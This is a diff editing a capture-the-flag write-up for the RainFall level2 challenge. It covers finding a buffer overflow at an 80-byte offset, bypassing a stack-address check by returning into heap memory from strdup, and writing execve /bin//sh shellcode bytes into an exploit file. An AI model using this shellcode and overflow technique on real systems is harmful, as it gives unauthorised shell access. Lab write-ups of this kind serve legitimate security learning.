@@ -20,11 +20,8 @@ level2@RainFall:~$ ./level2
 oh hi
 oh hi
 ```
-We get some weird output with longer input, then after a certain length it segfaults.
+After a certain length of input it segfaults.
 ```
-level2@RainFall:~$ ./level2
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaa
 level2@RainFall:~$ ./level2
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaa
@@ -55,7 +52,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac
 Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 ```
-This menas we can write our malicious code in the stdin, followed by garbage until the buffer overflows and we reach 80 characters, where the return address can be overwritten.
+This means we can write our malicious code in the stdin, followed by garbage until the buffer overflows and we reach 80 characters, where the return address can be overwritten.
 
 However, this buffer is stored on the stack, unfortunately function ```p``` checks to make sure the return address isn't in the stack.
 ```
@@ -84,12 +81,12 @@ ltrace also shows us strdup always uses the address ```0x804a008```, this indica
 
 So let's try to write our malicious shellcode in the heap by writing it in the input prompt. Then write the strdup malloc address on the return address.
 
-Our malicious shellcode simply needs to open a new shell. We find the unix syscall for execve is 11.
+Our malicious shellcode simply needs to open a new shell. To execute a program we use system call execve(), we find the unix syscall for execve is 11.
 ```
 level2@RainFall:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "execve"
 #define __NR_execve		 11
 ```
-Let's create the assembly code to do this, and break it down into bytecode.
+Let's create the assembly code to open a shell, and break it down into bytecode.
 ```
 +----------------+-----------------------+-----------------------+----------------------------------------------+
 | Bytecode       | (Intermediate)        | Assembly              | Comments                                     |
@@ -106,7 +103,7 @@ Let's create the assembly code to do this, and break it down into bytecode.
 | cd 80          | int    0x80           | int   0x80            | syscall                                      |
 +----------------+-----------------------+-----------------------+----------------------------------------------+
 ```
-Lets create our exploit file, starting with our malicious shellcode, adding backslash ```\x``` to write as bytes.
+Lets create our exploit file, starting with our malicious bytecode, adding backslash ```\x``` to write as bytes.
 ```
 level2@RainFall:~$ echo -e -n "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" > /tmp/level2_exploit
 ```
